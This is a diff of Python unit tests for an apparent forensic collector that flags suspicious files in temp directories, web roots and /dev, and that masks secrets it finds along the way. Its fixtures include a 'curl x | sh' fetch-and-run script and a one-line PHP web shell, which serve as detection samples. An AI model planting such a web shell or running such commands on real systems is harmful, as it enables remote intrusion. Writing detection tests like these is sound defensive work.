@@ -3403,6 +3403,124 @@ class SystemFilesTests(FixtureRoot):
         self.assertEqual(found["/usr/bin/capped"]["capabilities"], "cap_setuid=ep")
 
 
+def unusual_settings(web_roots=None):
+    value = json.loads(settings(["unusual_files"]))
+    if web_roots is not None:
+        value["web_roots"] = web_roots
+    return json.dumps(value)
+
+
+class UnusualFilesTests(FixtureRoot):
+    def run_unusual(self, web_roots=None):
+        collector = load_collector(self.root)
+        collector.file_capabilities = lambda absolute: ({}, None)
+        out = io.BytesIO()
+        collector.main(unusual_settings(web_roots), out=out)
+        return [json.loads(x) for x in gzip.decompress(out.getvalue()).splitlines()]
+
+    def scratch_fixture(self):
+        self.write("tmp/.x/payload", b"\x7fELF miner").chmod(0o755)
+        self.write("tmp/kworker", b"#!/bin/sh\ncurl x | sh\n").chmod(0o755)
+        self.write("tmp/[kthreadd]", b"\x7fELF").chmod(0o644)
+        Path(self.root, "tmp/...").mkdir()
+        self.write("tmp/notes.txt", b"just text")
+        old = self.write("tmp/backdated", b"\x7fELF", age_days=400)
+        old.chmod(0o755)  # changes ctime to now; mtime stays 400 days old
+        self.write("tmp/rootsh", b"\x7fELF sh").chmod(0o4755)
+        self.write("var/tmp/stash.tar", b"tar")
+        self.write("dev/shm/.s", b"\x7fELF").chmod(0o755)
+        self.write("dev/.udev-rootkit/lib.so", b"\x7fELF")
+        self.write("dev/sdz", b"not a device")  # a regular file in /dev
+
+    def test_scratch_places_and_dev(self):
+        self.scratch_fixture()
+        records = self.run_unusual(web_roots=[])
+        files = {r["path"]: r for r in records_named(records, "unusual_file")}
+        self.assertIn("/tmp/notes.txt", files)  # everything listed in scratch places
+        self.assertNotIn("sha256", files["/tmp/notes.txt"])  # not runnable: not hashed
+        self.assertEqual(files["/tmp/.x/payload"]["kind"], "elf")
+        self.assertIn("hidden", files["/tmp/.x/payload"]["name_flags"])
+        self.assertEqual(
+            files["/tmp/.x/payload"]["sha256"], hashlib.sha256(b"\x7fELF miner").hexdigest()
+        )
+        self.assertEqual(files["/tmp/kworker"]["kind"], "script")
+        self.assertIn("system_name", files["/tmp/kworker"]["name_flags"])
+        self.assertIn("kernel_thread_name", files["/tmp/[kthreadd]"]["name_flags"])
+        self.assertIn("dots_or_spaces_only", files["/tmp/..."]["name_flags"])
+        self.assertGreater(files["/tmp/backdated"]["changed_after_modified_seconds"], 300 * DAY)
+        self.assertTrue(files["/tmp/rootsh"]["setuid"])
+        self.assertIn("/var/tmp/stash.tar", files)
+        self.assertIn("/dev/shm/.s", files)
+        self.assertIn("/dev/sdz", files)
+        self.assertIn("/dev/.udev-rootkit", files)
+        self.assertEqual(sources(records), {})  # no contents
+        self.assertEqual(records[-1]["modules"]["unusual_files"]["status"], "ok")
+
+    def test_web_roots_default_and_host_override(self):
+        self.write("var/www/app/index.php", b"<?php echo 1;")
+        self.write("var/www/app/uploads/photo.jpg", b"jpeg")
+        self.write("var/www/app/uploads/shell.php", b"<?php system($_GET[c]);")
+        self.write("var/www/app/.htaccess", b"Options -Indexes")
+        self.write("srv/app/public/x.phtml", b"<?php")
+        records = self.run_unusual()
+        web = {r["path"] for r in records_named(records, "web_file")}
+        self.assertEqual(
+            web,
+            {"/var/www/app/index.php", "/var/www/app/uploads/shell.php", "/var/www/app/.htaccess"},
+        )
+        self.assertEqual(records_named(records, "web_roots")[0]["source"], "default")
+        summary = [w for w in records_named(records, "walk_summary") if w["place"] == "/var/www"][0]
+        self.assertEqual(summary["not_listed"], 3)  # app, uploads, photo.jpg: counted only
+        records = self.run_unusual(web_roots=["/srv/app"])
+        web = {r["path"] for r in records_named(records, "web_file")}
+        self.assertEqual(web, {"/srv/app/public/x.phtml"})  # the host's list replaces the defaults
+        self.assertEqual(
+            records_named(records, "web_roots")[0], {"roots": ["/srv/app"], "source": "host"}
+        )
+
+    def test_privileged_files_outside_system_directories(self):
+        self.write("home/jch/.cache/x", b"\x7fELF").chmod(0o4755)
+        self.write("var/lib/docker/overlay2/abc/diff/usr/bin/su", b"\x7fELF").chmod(0o4755)
+        self.write("var/tmp/rootsh", b"\x7fELF").chmod(0o4755)
+        self.write("srv/data/report.csv", b"a,b")
+        records = self.run_unusual(web_roots=[])
+        privileged = [r["path"] for r in records_named(records, "privileged_file")]
+        self.assertEqual(privileged, ["/home/jch/.cache/x"])  # not docker's, not twice
+        listed = [r["path"] for r in records_named(records, "unusual_file")]
+        self.assertIn("/var/tmp/rootsh", listed)
+        pruned = [
+            w for w in records_named(records, "walk_summary") if w["not_descended"].get("pruned")
+        ]
+        self.assertTrue(pruned)
+
+    def test_protected_files_are_not_even_sniffed(self):
+        self.write("etc/passwd", b"jch:x:1000:1000::/home/jch:/bin/bash\n")
+        self.write("home/jch/.bash_history", b"#!not really a script\n")
+        Path(self.root, "tmp").mkdir()
+        os.link(Path(self.root, "home/jch/.bash_history"), Path(self.root, "tmp/h"))
+        records = self.run_unusual(web_roots=[])
+        entry = {r["path"]: r for r in records_named(records, "unusual_file")}["/tmp/h"]
+        self.assertNotIn("kind", entry)  # its first bytes weren't read
+
+    def test_secret_shaped_names_are_masked(self):
+        self.write("tmp/password=CanaryNameSecret.txt", b"x")
+        os.symlink("https://u:CanaryLinkPass@h/x", Path(self.root, "tmp/link"))
+        records = self.run_unusual(web_roots=[])
+        raw = json.dumps(records)
+        self.assertNotIn("CanaryNameSecret", raw)
+        self.assertNotIn("CanaryLinkPass", raw)
+        masked = [r for r in records_named(records, "unusual_file") if r.get("masked")]
+        self.assertEqual(len(masked), 2)
+
+    def test_name_flags(self):
+        flags = load_collector("/nonexistent").name_flags
+        self.assertEqual(flags("ok", "/a/ok"), [])
+        self.assertIn("leading_or_trailing_space", flags("x ", "/x "))
+        self.assertIn("control_characters", flags("a\nb", "/a\nb"))
+        self.assertIn("non_ascii", flags("ѕshd", "/ѕshd"))  # Cyrillic s
+        self.assertIn("hidden", flags("f", "/.cache/f"))
+
+
 CANARIES = {
     "hash": "$6$CanarySalt$" + "H" * 86,
     "gecos": "CanaryGecosName",
@@ -3427,6 +3545,8 @@ CANARIES = {
     "btmp": "CanaryBtmpPass",
     "core": "CanaryCoreMemory",
     "typed": "CanaryTypedPass1",  # a bare password typed as a user name
+    "tmpbody": "CanaryTmpFileBody",
+    "tmpname": "CanaryTmpFileName",
 }
 
 
@@ -3783,6 +3903,12 @@ class CanaryTests(FixtureRoot):
         )
         os.link(Path(self.root, "home/jch/.bash_history"), Path(self.root, "var/log/wtmp.1"))
         self.write("var/lib/systemd/coredump/core.x.zst", c["core"].encode())
+        # Scratch places: a secret in a file's contents and in its name, and
+        # a hard link to a history file (never read, not even its magic).
+        self.write("tmp/drop", f"{c['tmpbody']}\n".encode()).chmod(0o755)
+        self.write(f"tmp/token={c['tmpname']}", b"x")
+        os.link(Path(self.root, "home/jch/.bash_history"), Path(self.root, "tmp/h"))
+        self.write("var/www/site/shell.php", f"<?php // {c['tmpbody']}".encode())
         self.write("var/crash/_usr_bin_x.crash", c["core"].encode())
         # Persistence: an at job's environment and output, crontab and unit
         # secrets, and start-up files and units in homes (hashes only).
